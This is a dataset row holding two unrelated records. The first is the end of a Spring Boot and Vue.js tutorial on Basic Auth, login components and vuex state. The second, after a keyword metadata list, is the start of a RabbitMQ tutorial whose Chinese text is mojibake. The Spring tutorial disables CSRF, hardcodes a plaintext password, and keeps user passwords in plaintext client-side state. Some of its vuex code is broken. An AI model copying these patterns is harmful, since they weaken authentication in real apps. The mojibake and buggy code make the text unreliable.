            .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) // No session will be created or used by spring security
        .and()
            .httpBasic()
        .and()
            .authorizeRequests()
                .antMatchers(""/api/hello"").permitAll()
                .antMatchers(""/api/user/**"").permitAll() // allow every URI, that begins with '/api/user/'
                .antMatchers(""/api/secured"").authenticated()
                .anyRequest().authenticated() // protect all other requests
        .and()
            .csrf().disable(); // disable cross site request forgery, as we don't use cookies - otherwise ALL PUT, POST, DELETE will get HTTP 403!
    }

    @Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        auth.inMemoryAuthentication()
                .withUser(""foo"").password(""{noop}bar"").roles(""USER"");
    }
}

```

Using a simple `http.httpBasic()` we configure to provide a Basic Authentication for our secured resources.

To deep dive into the Matcher configurations, have a look into https://docs.spring.io/spring-security/site/docs/current/reference/htmlsingle/#jc-authorize-requests

#### Be aware of CSRF!

__BUT:__ Be aware of the CSRF (cross site request forgery) part! The defaults will render a [HTTP 403 FORBIDDEN for any HTTP verb that modifies state (PATCH, POST, PUT, DELETE)](https://docs.spring.io/spring-security/site/docs/current/reference/htmlsingle/#csrf-configure):

> by default Spring Securityâ€™s CSRF protection will produce an HTTP 403 access denied.

For now we can disable the default behavior with `http.csrf().disable()`


#### Testing the secured Backend

See https://www.baeldung.com/rest-assured-authentication

Inside our [BackendControllerTest](backend/src/test/java/de/jonashackt/springbootvuejs/controller/BackendControllerTest.java) we should check, whether our API reacts with correct HTTP 401 UNAUTHORIZED, when called without our User credentials:

```
	@Test
	public void secured_api_should_react_with_unauthorized_per_default() {

		given()
		.when()
			.get(""/api/secured"")
		.then()
			.statusCode(HttpStatus.SC_UNAUTHORIZED);
	}
```

Using `rest-assured` we can also test, if one could access the API correctly with the credentials included:

```
	@Test
	public void secured_api_should_give_http_200_when_authorized() {

		given()
			.auth().basic(""foo"", ""bar"")
		.when()
			.get(""/api/secured"")
		.then()
			.statusCode(HttpStatus.SC_OK)
			.assertThat()
				.body(is(equalTo(BackendController.SECURED_TEXT)));
	}
```

The crucial point here is to use the `given().auth().basic(""foo"", ""bar"")` configuration to inject the correct credentials properly.



#### Configure credentials inside application.properties and environment variables

Defining the users (and passwords) inside code (like our [WebSecurityConfiguration.class](backend/src/main/java/de/jonashackt/springbootvuejs/configuration/WebSecurityConfiguration.java)) that should be given access to our application is a test-only practice!

For our super simple example application, we could have a solution quite similar - but much more safe: If we would be able to extract this code into configuration and later use Spring's powerful mechanism of overriding these configuration with environment variables, we could then store them safely inside our deployment pipelines settings, that are again secured by another login - e.g. as Heroku Config Vars.

Therefore the first step would be to delete the following code:

```
@Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        auth.inMemoryAuthentication()
                .withUser(""foo"").password(""{noop}bar"").roles(""USER"");
    }
```

and add the following configuration to our [application.properties](backend/src/main/resources/application.properties):

```
spring.security.user.name=sina
spring.security.user.password=miller
```

Running our tests using the old credentials should fail now. Providing the newer one, the test should go green again.

Now introducing environment variables to the game could also be done locally inside our IDE for example. First change the test `secured_api_should_give_http_200_when_authorized` again and choose some new credentials like user `maik` with pw `meyer`.

Don't change the `application.properties` right now - use your IDE's run configuration and insert two environment variables:

```
SPRING_SECURITY_USER_NAME=maik
SPRING_SECURITY_USER_PASSWORD=meyer
```

Now the test should run green again with this new values.


## Protect parts of Vue.js frontend

Now that we have secured a specific part of our backend API, let's also secure a part of our Vue.js frontend:

        +-----------------------------------------------------------------------+
        |  Vue.js frontend                                                      |
        |                                                                       |
        |   +-----------------+    +-----------------+    +-----------------+   |
        |   |                 |    |                 |    |                 |   |
        |   |                 |    |                 |    |  Protected      |   |
        |   |                 |    |                 |    |                 |   |
        |   |                 |    |                 |    |  Vue.js View    |   |
        |   |                 |    |                 |    |                 |   |
        |   +-----------------+    +-----------------+    +-----------------+   |
        |                                                                       |
        +-----------------------------------------------------------------------+

                   +---+                  +---+                  +---+
                   |   | /api/hello       |   | /api/user        |   | /api/secured
                   +---+                  +---+                  +---+
                     |                      |                      |
        +-----------------------------------------------------------------------+
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |  Spring Boot backend                                                  |
        +-----------------------------------------------------------------------+


#### Create a new Vue Login component

As there is already a secured Backend API, we also want to have a secured frontend part. 

Every solution you find on the net seems to be quite overengineered for the ""super-small-we-have-to-ship-today-app"". Why should we bother with a frontend auth store like vuex at the beginning? Why start with OAuth right up front? These could be easily added later on!

The simplest solution one could think about how to secure our frontend, would be to create a simple Login.vue component, that simply accesses the `/api/secured` resource every time the login is used.

Therefore we use [Vue.js conditionals](https://vuejs.org/v2/guide/conditional.html) to show something on our new [Login.vue](frontend/src/components/Login.vue):

```
<template>
  <div class=""protected"" v-if=""loginSuccess"">
    <h1><b-badge variant=""success"">Access to protected site granted!</b-badge></h1>
    <h5>If you're able to read this, you've successfully logged in.</h5>
  </div>
  <div class=""unprotected"" v-else-if=""loginError"">
    <h1><b-badge variant=""danger"">You don't have rights here, mate :D</b-badge></h1>
    <h5>Seams that you don't have access rights... </h5>
  </div>
  <div class=""unprotected"" v-else>
    <h1><b-badge variant=""info"">Please login to get access!</b-badge></h1>
    <h5>You're not logged in - so you don't see much here. Try to log in:</h5>

    <form @submit.prevent=""callLogin()"">
      <input type=""text"" placeholder=""username"" v-model=""user"">
      <input type=""password"" placeholder=""password"" v-model=""password"">
      <b-btn variant=""success"" type=""submit"">Login</b-btn>
      <p v-if=""error"" class=""error"">Bad login information</p>
    </form>
  </div>

</template>

<script>
import api from './backend-api'

export default {
  name: 'login',

  data () {
    return {
      loginSuccess: false,
      loginError: false,
      user: '',
      password: '',
      error: false
    }
  }
}

</script>
``` 

For now the conditional is only handled by two boolean values: `loginSuccess` and `loginError`.

To bring those to life, we implement the `callLogin()` method:

```
,
  methods: {
    callLogin() {
      api.getSecured(this.user, this.password).then(response => {
        console.log(""Response: '"" + response.data + ""' with Statuscode "" + response.status)
        if(response.status == 200) {
          this.loginSuccess = true
        }
      }).catch(error => {
        console.log(""Error: "" + error)
        this.loginError = true
      })
    }
  }
```

With this simple implementation, the Login component asks the Spring Boot backend, if a user is allowed to access the `/api/secured` resource. The [backend-api.js](frontend/src/components/backend-api.js) provides an method, which uses axios' Basic Auth feature:

```
    getSecured(user, password) {
        return AXIOS.get(`/secured/`,{
            auth: {
                username: user,
                password: password
            }});
    }
``` 

Now the Login component works for the first time:

![secure-spring-vue-simple-login](screenshots/secure-spring-vue-simple-login.gif)




#### Protect multiple Vue.js components

Now we have a working Login component. Now let's create a new `Protected.vue` component, since we want to have something that's only accessible, if somebody has logged in correctly:

```
<template>
  <div class=""protected"" v-if=""loginSuccess"">
    <h1><b-badge variant=""success"">Access to protected site granted!</b-badge></h1>
    <h5>If you're able to read this, you've successfully logged in.</h5>
  </div>
  <div class=""unprotected"" v-else>
    <h1><b-badge variant=""info"">Please login to get access!</b-badge></h1>
    <h5>You're not logged in - so you don't see much here. Try to log in:</h5>
    <router-link :to=""{ name: 'Login' }"" exact target=""_blank"">Login</router-link>
  </div>

</template>

<script>
import api from './backend-api'

export default {
  name: 'protected',

  data () {
    return {
      loginSuccess: false,
      error: false
    }
  },
  methods: {
    //
  }
}

</script>
```

This component should only be visible, if the appropriate access was granted at the Login. Therefore we need to solve 2 problems:

* __Store the login state__
* __Redirect user from Protected.vue to Login.vue, if not authenticated before__



#### Store login information with vuex

The super dooper simple solution would be to simply use `LocalStorage`. But with [vuex](https://github.com/vuejs/vuex) there is a centralized state management in Vue.js, which is pretty popular. So we should invest some time to get familiar with it. There's a full guide available: https://vuex.vuejs.org/guide/ and a great introductory blog post here: https://pusher.com/tutorials/authentication-vue-vuex

You could also initialize a new Vue.js project with Vue CLI and mark the `vuex` checkbox. But we try to extend the current project here.

First we add [the vuex dependency](https://www.npmjs.com/package/vuex) into our [package.json](frontend/package.json):

```
...
    ""vue"": ""^2.6.10"",
    ""vue-router"": ""^3.0.6"",
    ""vuex"": ""^3.1.1""
  },
```

> There are four things that go into a Vuex module: the initial [state](https://vuex.vuejs.org/guide/state.html), [getters](https://vuex.vuejs.org/guide/getters.html), [mutations](https://vuex.vuejs.org/guide/mutations.html) and [actions](https://vuex.vuejs.org/guide/actions.html)

#### Define the vuex state

To implement them, we create a new [store.js](frontend/src/store.js) file:

```
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)

export default new Vuex.Store({
    state: {
        loginSuccess: false,
        loginError: false,
        userName: null
    },
  mutations: {

  },
  actions: {

  },
  getters: {
  
  }
})

``` 

We only have an initial state here, which is that a login could be successful or not - and there should be a `userName`.


#### Define a vuex action login() and the mutations login_success & login_error

Then we have a look onto __vuex actions: They provide a way to commit mutations to the vuex store.__ 

As our app here is super simple, we only have one action to implement here: `login`. We omit the `logout` and `register` actions, because we only define one admin user in the Spring Boot backend right now and don't need an implemented logout right now. Both could be implemented later!

We just shift our logic on how to login a user from the `Login.vue` to our vuex action method:

```
    mutations: {
        login_success(state, name){
            state.loginSuccess = true
            state.userName = name

        },
        login_error(state){
            state.loginError = true
            state.userName = name
        }
    },
    actions: {
        async login({commit}, user, password) {
            api.getSecured(user, password)
                .then(response => {
                    console.log(""Response: '"" + response.data + ""' with Statuscode "" + response.status);
                    if(response.status == 200) {
                        // place the loginSuccess state into our vuex store
                        return commit('login_success', name);
                    }
                }).catch(error => {
                    console.log(""Error: "" + error);
                    // place the loginError state into our vuex store
                    commit('login_error', name);
                    return Promise.reject(""Invald credentials!"")
                })
        }
    },
```

Instead of directly setting a boolean to a variable, we `commit` a mutation to our store if the authentication request was successful or unsuccessful. We therefore implement two simple mutations: `login_success` & `login_error`


#### Last but not least: define getters for the vuex state

To be able to access vuex state from within other components, we need to implement getters inside our vuex store. As we only want some simple info, we need the following getters:

```
    getters: {
        isLoggedIn: state => state.loginSuccess,
        hasLoginErrored: state => state.loginError
    }
```

#### Use vuex Store inside the Login component and forward to Protected.vue, if Login succeeded

Instead of directly calling the auth endpoint via axios inside our Login component, we now want to use our vuex store and its actions instead. Therefore we don't even need to import the [store.js](frontend/src/store.js) inside our `Login.vue`, we can simply access it through `$store`. Thy is that? Because we already did that inside our [main.js](frontend/src/main.js):

```
import store from './store'

...

new Vue({
    router,
    store,
    render: h => h(App)
}).$mount('#app')
```

With that configuration `store` and `router` are accessible from within every Vue component with the `$` prefixed :) 

If we have a look into our `Login.vue` we see that in action:

```
callLogin() {
      this.$store.dispatch('login', { user: this.user, password: this.password})
        .then(() => this.$router.push('/Protected'))
        .catch(error => {
          this.error.push(error)
        })
    }
```

Here we access our vuex store action `login` and issue a login request to our Spring Boot backend. If this succeeds, we use the Vue `$router` to forward the user to our `Protected.vue` component.


#### Redirect user from Protected.vue to Login.vue, if not authenticated before

Now let's enhance our [router.js](frontend/src/router.js) slightly. We use the Vue.js routers' [meta field](https://router.vuejs.org/guide/advanced/meta.html) feature to check, whether a user is loggin in already and therefore should be able to access our Protected component with the URI `/protected` :

```
    {
        path: '/protected',
        component: Protected,
        meta: { 
            requiresAuth: true 
        }
    },
``` 

We also add a new behavior to our router, that checks if it requires authentication every time a route is accessed. If so, it will redirect to our Login component:

```
router.beforeEach((to, from, next) => {
    if (to.matched.some(record => record.meta.requiresAuth)) {
        // this route requires auth, check if logged in
        // if not, redirect to login page.
        if (!store.getters.isLoggedIn) {
            next({
                path: '/login'
            })
        } else {
            next();
        }
    } else {
        next(); // make sure to always call next()!
    }
});
```

Now if one clicks onto `Protected` and didn't login prior, our application redirects to `Login` automatically:

![secure-spring-redirect-to-login](screenshots/secure-spring-redirect-to-login.gif)

With this redirect, we also don't need the part with `<div class=""protected"" v-if=""loginSuccess"">` inside our Login.vue, since in case of a successful login, the user is directly redirected to the Protected.vue.


## Check auth state at secured backend endpoints

We're now already where we wanted to be at the first place: Our Spring Boot backend has a secured API endpoint, which works with simple user/password authentication. And our Vue.js frontend uses this endpoint to do a Login and protect the `Protected` component, if the user didn't log in before. The login state is held in the frontend, using the `vuex` store.

Now if we want to go a step ahead and call a secured API endpoint in the backend from within our `Protected` frontend component, we need to fully store the credentials inside our `vuex` store, so we could access our secured resource


        +-----------------------------------------------------------------------+
        |  Vue.js frontend                                                      |
        |                          +----------------------------------------+   |
        |                          |                vuex store              |   |
        |                          +----------------------------------------+   |
        |                                   |                      |            |
        |   +-----------------+    +-----------------+    +-----------------+   |
        |   |                 |    |                 |    |                 |   |
        |   |                 |    |    Login.vue    |    |    Protected    |   |
        |   |                 |    |                 |    |                 |   |
        |   +-----------------+    +-----------------+    +-----------------+   |
        |                                           |               |           |
        +-------------------------------------------|---------------|-----------+
                                                    |-------------| |  
                   +---+                  +---+                  +---+
                   |   | /api/hello       |   | /api/user        |   | /api/secured
                   +---+                  +---+                  +---+
                     |                      |                      |
        +-----------------------------------------------------------------------+
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |  Spring Boot backend                                                  |
        +-----------------------------------------------------------------------+

Therefore we enhance our [store.js](frontend/src/store.js):

```
export default new Vuex.Store({
    state: {
        loginSuccess: false,
        loginError: false,
        userName: null,
        userPass: null,
        response: []
    },
    mutations: {
        login_success(state, payload){
            state.loginSuccess = true;
            state.userName = payload.userName;
            state.userPass = payload.userPass;
        },
    ...
    },
    actions: {
        login({commit}, {user, password}) {
            ...
                            // place the loginSuccess state into our vuex store
                            commit('login_success', {
                                userName: user,
                                userPass: password
                            });
            ...
    getters: {
        isLoggedIn: state => state.loginSuccess,
        hasLoginErrored: state => state.loginError,
        getUserName: state => state.userName,
        getUserPass: state => state.userPass
    }
```

> Be sure to use the current way to define and [interact with vuex mutations](https://vuex.vuejs.org/guide/mutations.html). Lot's of blog posts are using an old way of committing multiple parameters like `commit('auth_success', token, user)`. This DOES NOT work anymore. Only the first parameter will be set, the others are lost! 

Now inside our [Protected.vue](frontend/src/components/Protected.vue), we can use the stored credentials to access our `/secured` endpoint:

```
<script>
  import api from './backend-api'
  import store from './../store'

export default {
  name: 'protected',

  data () {
    return {
      backendResponse: '',
      securedApiCallSuccess: false,
      errors: null
    }
  },
  methods: {
    getSecuredTextFromBackend() {
      api.getSecured(store.getters.getUserName, store.getters.getUserPass)
              .then(response => {
                console.log(""Response: '"" + response.data + ""' with Statuscode "" + response.status);
                this.securedApiCallSuccess = true;
                this.backendResponse = response.data;
              })
              .catch(error => {
                console.log(""Error: "" + error);
                this.errors = error;
              })
    }
  }
}
```

Feel free to create a nice GUI based on `securedApiCallSuccess`, `backendResponse` and `errors` :)



# Links

Nice introductory video: https://www.youtube.com/watch?v=z6hQqgvGI4Y

Examples: https://vuejs.org/v2/examples/

Easy to use web-based Editor: https://vuejs.org/v2/examples/
",0,1,2,16.0,"['upgrade', 'procedure', 'in', 'search', 'new', 'web', 'year', 'absence', 'setup', 'spring', 'boot', 'prerequisite', 'macosx', 'linux', 'window', 'project', 'setup', 'backend', 'frontend', 'use', 'handle', 'npm', 'node', 'bower', 'grunt', 'gulp', 'webpack', 'tell', 'webpack', 'output', 'content', 'first', 'app', 'run', 'faster', 'feedback', 'browser', 'developer', 'tool', 'extension', 'intellij', 'integration', 'http', 'call', 'spring', 'boot', 'rest', 'backend', 'the', 'problem', 'sop', 'enable', 'axios', 'cors', 'support', 'enable', 'spring', 'boot', 'cors', 'support', 'but', 'stop', 'webpack', 'vue', 'something', 'much', 'smarter', 'u', 'help', 'u', 'sop', 'use', 'history', 'mode', 'nicer', 'url', 'bootstrap', 'heroku', 'deployment', 'access', 'spring', 'boot', 'rest', 'backend', 'heroku', 'frontend', 'use', 'heroku', 'postgres', 'database', 'spring', 'boot', 'backend', 'frontend', 'test', 'install', 'jest', 'jest', 'configuration', 'integration', 'maven', 'build', 'via', 'run', 'jest', 'test', 'inside', 'intellij', 'test', 'nightwatch', 'write', 'nightwatch', 'test', 'run', 'test', 'run', 'test', 'npm', 'security', 'shift', 'templates', 'architecture', 'vue', 'cli', 'omg', 'my', 'small', 'vue', 'cli', 'plugins', 'the', 'file', 'update', 'vue', 'exist', 'project', 'upgrade', 'next', 'upgrade', 'add', 'typescript', 'typescript', 'vuex', 'store', 'typescript', 'bootstrap', 'support', 'build', 'run', 'docker', 'docker', 'build', 'building', 'app', 'maven', 'just', 'echo', 'see', 'everything', 'run', 'maven', 'build', 'exclude', 'underlie', 'o', 'specific', 'node', 'module', 'also', 'leave', 'output', 'folder', 'just', 'use', 'build', 'artifact', 'remove', 'add', 'spring', 'boot', 'container', 'fire', 'spring', 'boot', 'app', 'default', 'autorelease', 'docker', 'hub', 'run', 'jdk', 'ff', 'secure', 'spring', 'boot', 'backend', 'protect', 'frontend', 'secure', 'backend', 'api', 'spring', 'security', 'configure', 'spring', 'security', 'be', 'aware', 'csrf', 'test', 'secure', 'backend', 'configure', 'credential', 'inside', 'environment', 'variable', 'protect', 'part', 'frontend', 'create', 'new', 'vue', 'login', 'component', 'protect', 'multiple', 'component', 'store', 'login', 'information', 'vuex', 'define', 'vuex', 'state', 'define', 'vuex', 'action', 'login', 'mutation', 'last', 'least', 'define', 'getters', 'vuex', 'state', 'use', 'vuex', 'store', 'inside', 'login', 'component', 'forward', 'login', 'succeed', 'redirect', 'user', 'authenticate', 'check', 'auth', 'state', 'secure', 'backend', 'endpoint', 'link']","['spring', 'boot', 'backend', 'run', 'test']",3.0,"[com.github.eirslett:frontend-maven-plugin,maven-resources-plugin,org.jacoco:jacoco-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,2.0,1.0
joeljhou/RabbitMQ,master,"# é«˜å¹¶å‘å®æˆ˜-RabbitMQæ¶ˆæ¯é˜Ÿåˆ—

## 1-è®¤è¯†RabbitMQ

**Message Queueï¼ˆMQï¼‰**

* ==æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMessage Queueï¼‰==ï¼Œåæ–‡ç§°**MQ**ï¼Œæ˜¯ä¸€ç§è·¨è¿›ç¨‹çš„é€šä¿¡æœºåˆ¶ï¼Œç”¨äºä¸Šä¸‹æ¸¸ä¼ é€’æ¶ˆæ¯ã€‚
* MQä½œä¸ºæ¶ˆæ¯ä¸­é—´ä»¶ï¼Œæœ€ä¸»è¦çš„ä½œç”¨ç³»ç»Ÿä¹‹é—´çš„ä¿¡æ¯ä¼ é€’è¿›è¡Œâ€œ**è§£è€¦**â€ï¼ŒMQæ˜¯æ•°æ®å¯é æ€§çš„é‡è¦ä¿éšœã€‚

**ä»€ä¹ˆæ˜¯RabbitMQï¼Ÿ**

[å®˜ç½‘](https://www.rabbitmq.com/) | [æ•™ç¨‹](https://www.rabbitmq.com/tutorials)

* RabbitMQæ˜¯å…¨ä¸–ç•Œæœ€ç«çš„å¼€æºæ¶ˆæ¯ä»£ç†æœåŠ¡å™¨ï¼Œåœ¨å…¨ä¸–ç•Œæ‹¥æœ‰è¶…è¿‡35000ä¸ªé¡¹ç›®éƒ¨ç½²åœ¨RabbitMQã€‚
* RabbitMQæ”¯æŒå‡ ä¹æ‰€æœ‰çš„æ“ä½œç³»ç»Ÿä¸ç¼–ç¨‹è¯­è¨€ã€‚
* RabbitMQæä¾›äº†é«˜å¹¶å‘ã€é«˜å¯ç”¨çš„æˆç†Ÿæ–¹æ¡ˆï¼Œæ”¯æŒå¤šç§æ¶ˆæ¯åè®®ï¼Œæ˜“äºéƒ¨ç½²ä¸ä½¿ç”¨ã€‚

**RabbitMQä¸å…¶ä»–MQçš„å¯¹æ¯”**

| ç‰¹æ€§        | RabbitMQ    | ActiveMQ | Kafka      | RocketMQ     |
|-----------|-------------|----------|------------|--------------|
| **ç¤¾åŒºæ´»è·ƒåº¦** | éå¸¸æ´»è·ƒ        | éå¸¸æ´»è·ƒ     | æ´»è·ƒ         | ä¸æ´»è·ƒ          |
| **æŒä¹…åŒ–**   | æ”¯æŒ          | æ”¯æŒ       | æ”¯æŒ         | æ”¯æŒ           |
| **å¹¶å‘ååé‡** | é«˜           | ä¸€èˆ¬       | ==æé«˜==     | ==æé«˜==       |
| **æ•°æ®å¯é æ€§** | ==æé«˜==      | ä¸€èˆ¬       | é«˜          | é«˜            |
| **ç”Ÿæ€å®Œæ•´åº¦** | å¾ˆå¥½          | å¾ˆå¥½       | å¾ˆå¥½         | ä¸€èˆ¬           |
| **ç”¨æˆ·æ€»é‡**  | å¤š           | å¤š->ä¸€èˆ¬    | è¾ƒå¤š         | å°‘            |
| **åº”è¯¥åœºæ™¯**  | åˆ†å¸ƒå¼ã€é«˜å¯é äº¤æ˜“ç³»ç»Ÿ | ä¼ ç»Ÿä¸šåŠ¡ç³»ç»Ÿ   | æ—¥å¿—å¤„ç†åŠå¤§æ•°æ®åº”ç”¨ | äº’è”ç½‘é«˜å¹¶å‘ã€é«˜å¯ç”¨åº”ç”¨ |

**RabbitMQçš„åº”ç”¨åœºæ™¯**

* **è§£è€¦**ï¼šå¼‚æ„ç³»ç»Ÿçš„æ•°æ®ä¼ é€’
* **å‰Šå³°å¡«è°·**ï¼šé«˜å¹¶å‘ç¨‹åºçš„æµé‡æ§åˆ¶
* **è®¢é˜…å‘å¸ƒ**ï¼šåŸºäºP2Pï¼ŒP2PPPçš„ç¨‹åº
* **TCCæ§åˆ¶**ï¼šåˆ†å¸ƒå¼ç³»ç»Ÿçš„äº‹åŠ¡ä¸€è‡´æ€§TCC
* **æ•°æ®å¯é æ€§**ï¼šé«˜å¯é æ€§çš„äº¤æ˜“ç³»ç»Ÿ

## 2-å®‰è£…RabbitMQ

**RabbitMQä½¿ç”¨Erlangå¼€å‘** | [ç‰ˆæœ¬å¯¹ç…§](https://www.rabbitmq.com/which-erlang.html)

* Erlang(['É™:lÃ¦Å‹])æ˜¯ä¸€ç§é€šç”¨çš„é¢å‘å¹¶å‘çš„ç¼–ç¨‹è¯­è¨€ï¼ŒErlangæ˜¯ä¸€ä¸ªç»“æ„åŒ–ï¼ŒåŠ¨æ€ç±»å‹ç¼–ç¨‹è¯­è¨€ï¼Œå†…å»ºå¹¶è¡Œè®¡ç®—æ”¯æŒã€‚
* ä½¿ç”¨Erlangæ¥ç¼–å†™åˆ†å¸ƒå¼åº”ç”¨è¦ç®€å•çš„å¤šï¼ŒErlangè¿è¡Œæ—¶ç¯å¢ƒæ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œæœ‰ç‚¹åƒJavaè™šæ‹Ÿæœºï¼Œè¿™æ ·ä»£ç ä¸€ç»ç¼–è¯‘ï¼ŒåŒæ ·å¯ä»¥éšå¤„è¿è¡Œã€‚

[RabbitMQ å®‰è£…æŒ‡å—](https://www.rabbitmq.com/docs/download)

```shell
# latest RabbitMQ 3.13
docker run -it --name rabbitmq \
  -p 5672:5672 \
  -p 15672:15672 \
  -v rabbitmq_3.13_volume:/var/lib/rabbitmq \
  rabbitmq:3.13-management
```

* å¯è§†åŒ–æ§åˆ¶å°ï¼š[http://localhost:15672/](http://localhost:15672/)
* ç®¡ç†å‘˜è´¦æˆ·å¯†ç ï¼šguest / guest
* 5672 ç«¯å£æ˜¯RabbitMQé€šä¿¡ç«¯å£ï¼Œ 15672 æ˜¯å¯è§†åŒ–æ§åˆ¶å°ç«¯å£

![RabbitMQç™»å½•åç•Œé¢](http://img.geekyspace.cn/pictures/2024/202405091646342.png)

## 3-RabbitMQå¸¸ç”¨å‘½ä»¤

**è¿›å…¥ RabbitMQ å®¹å™¨**

```shell
docker exec -it rabbitmq bash
```

è¿™ä¸ªå‘½ä»¤å°†ä»¥äº¤äº’æ¨¡å¼è¿›å…¥ RabbitMQ å®¹å™¨çš„ç»ˆç«¯ï¼Œä»¥ä¾¿æ‰§è¡Œåç»­çš„ RabbitMQ å‘½ä»¤

**å¸¸ç”¨ RabbitMQ å‘½ä»¤**

1. **ç®¡ç† RabbitMQ æœåŠ¡**

   ```shell
   rabbitmq-server            # å‰å°å¯åŠ¨
   rabbitmq-server -detached  # åå°å¯åŠ¨
   rabbitmqctl stop           # åœæ­¢æœåŠ¡
   ```

2. **ç®¡ç† RabbitMQ åº”ç”¨ç¨‹åº**

   ```shell
   rabbitmqctl start_app      # å¯åŠ¨åº”ç”¨
   rabbitmqctl stop_app       # åœæ­¢åº”ç”¨
   ```

3. **æŸ¥çœ‹ RabbitMQ èŠ‚ç‚¹çŠ¶æ€**

   ```shell
   rabbitmqctl status         # æŸ¥çœ‹çŠ¶æ€
   ```

4. **æ’ä»¶ç®¡ç†**

    * `rabbitmq_management`â€”Web ç®¡ç†æ’ä»¶

   ```shell
   rabbitmq-plugins list                        # åˆ—å‡ºæ’ä»¶
   rabbitmq-plugins enable {pluginname}         # å¯ç”¨æ’ä»¶
   rabbitmq-plugins disable {pluginname}        # ç¦ç”¨æ’ä»¶
   ```

5. **ç”¨æˆ·ç®¡ç†**

   ```shell
   # ç”¨æˆ·
   rabbitmqctl list_users                                 # åˆ—å‡ºæ‰€æœ‰ç”¨æˆ·
   rabbitmqctl add_user {username} {password}             # æ·»åŠ ç”¨æˆ·
   rabbitmqctl delete_user {username}                     # åˆ é™¤ç”¨æˆ·
   
   # æƒé™
   rabbitmqctl change_password {username} {newpassword}               # ä¿®æ”¹ç”¨æˆ·å¯†ç 
   rabbitmqctl set_permissions -p {vhost} {username} "".*"" "".*"" "".*""   # è®¾ç½®ç”¨æˆ·æƒé™
   rabbitmqctl set_user_tags {username} {tag}                         # è®¾ç½®ç”¨æˆ·è§’è‰²
   ```

6. **é˜Ÿåˆ—ç®¡ç†**

   ```shell
   # é˜Ÿåˆ—
   rabbitmqctl list_queues                  # åˆ—å‡ºé˜Ÿåˆ—
   rabbitmqctl -p {vhost} purge_queue blue  # æ¸…é™¤é˜Ÿåˆ—
   
   # è™šæ‹Ÿä¸»æœº
   rabbitmqctl list_vhost                          # åˆ—å‡ºè™šæ‹Ÿä¸»æœº
   rabbitmqctl add_vhost {vhostpath}               # åˆ›å»ºè™šæ‹Ÿä¸»æœº
   rabbitmqctl list_permissions -p {vhostpath}     # åˆ—å‡ºè™šæ‹Ÿä¸»æœºä¸Šæ‰€æœ‰æƒé™
   rabbitmqctl deleteâ€”â€”vhost {vhostpath}           # åˆ é™¤è™šæ‹Ÿä¸»æœº
   ```

**RabbitMQç”¨æˆ·å››ç§è§’è‰²Tag**

| ç”¨æˆ·è§’è‰²Tag                | æè¿°                                                                         |
|------------------------|----------------------------------------------------------------------------|
| **è¶…çº§ç®¡ç†å‘˜**(Admin)       | å¯ç™»é™†ç®¡ç†æ§åˆ¶å°(å¯ç”¨management pluginçš„æƒ…å†µä¸‹)ï¼Œå¯æŸ¥çœ‹æ‰€æœ‰çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯ä»¥å¯¹ç”¨æˆ·ï¼Œç­–ç•¥(policy)è¿›è¡Œæ“ä½œã€‚         |
| **ç›‘æ§è€…**(Monitoring)    | ç™»é™†ç®¡ç†æ§åˆ¶å°(å¯ç”¨management pluginçš„æƒ…å†µä¸‹)ï¼ŒåŒæ—¶å¯ä»¥æŸ¥çœ‹rabbitmqèŠ‚ç‚¹çš„ç›¸å…³ä¿¡æ¯(è¿›ç¨‹æ•°ï¼Œå†…å­˜ä½¿ç”¨æƒ…å†µï¼Œç£ç›˜ä½¿ç”¨æƒ…å†µç­‰) |
| **ç­–ç•¥åˆ¶å®šè€…**(Policymaker) | å¯ç™»é™†ç®¡ç†æ§åˆ¶å°(å¯ç”¨management pluginçš„æƒ…å†µä¸‹), åŒæ—¶å¯ä»¥å¯¹policyè¿›è¡Œç®¡ç†ã€‚ä½†æ— æ³•æŸ¥çœ‹èŠ‚ç‚¹çš„ç›¸å…³ä¿¡æ¯ã€‚           |
| **æ™®é€šç®¡ç†è€…**(Management)  | ä»…å¯ç™»é™†ç®¡ç†æ§åˆ¶å°(å¯ç”¨management pluginçš„æƒ…å†µä¸‹)ï¼Œæ— æ³•çœ‹åˆ°èŠ‚ç‚¹ä¿¡æ¯ï¼Œä¹Ÿæ— æ³•å¯¹ç­–ç•¥è¿›è¡Œç®¡ç†ã€‚                    |

## 4-ç‚¹å¯¹ç‚¹MQé€šä¿¡

**AMQP**

**AMQP**ï¼ˆAdvanced Message Queuing Protocolï¼‰æ˜¯ä¸€ç§ç½‘ç»œåè®®ï¼Œç”¨äºåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­è¿›è¡Œæ¶ˆæ¯ä¼ é€’ã€‚
å®ƒè¢«è®¾è®¡ç”¨æ¥æ”¯æŒé«˜æ€§èƒ½ã€å¯é æ€§å’Œå¯æ‰©å±•æ€§çš„æ¶ˆæ¯ä¼ é€’ç³»ç»Ÿï¼Œå¸¸ç”¨äºæ¶ˆæ¯é˜Ÿåˆ—ä¸­é—´ä»¶ï¼ˆå¦‚ RabbitMQï¼‰ä¸åº”ç”¨ç¨‹åºä¹‹é—´çš„é€šä¿¡ã€‚

**åŸºæœ¬æ¦‚å¿µ**
![Hello Worldï¼](http://img.geekyspace.cn/pictures/2024/202405111147828.png)

* **Producer**ï¼šç”Ÿäº§è€…ï¼Œæ¶ˆæ¯çš„æä¾›è€…
* **Consumer**ï¼šæ¶ˆè´¹è€…ï¼Œæ¶ˆæ¯çš„ä½¿ç”¨è€…
* **Message**ï¼šæ¶ˆæ¯ï¼Œç¨‹åºé—´çš„é€šä¿¡çš„æ•°æ®
* **Queue**ï¼šé˜Ÿåˆ—ï¼Œæ¶ˆæ¯å­˜æ”¾çš„å®¹å™¨ï¼Œæ¶ˆæ¯å…ˆè¿›å…ˆå‡º
* **Vhost**ï¼šè™šæ‹Ÿä¸»æœº,ç›¸å½“äºMQçš„â€œæ•°æ®åº“â€ï¼Œç”¨äºå­˜å‚¨é˜Ÿåˆ—

**Javaåˆ›å»ºMavené¡¹ç›®ä½¿ç”¨RabbitMQ**

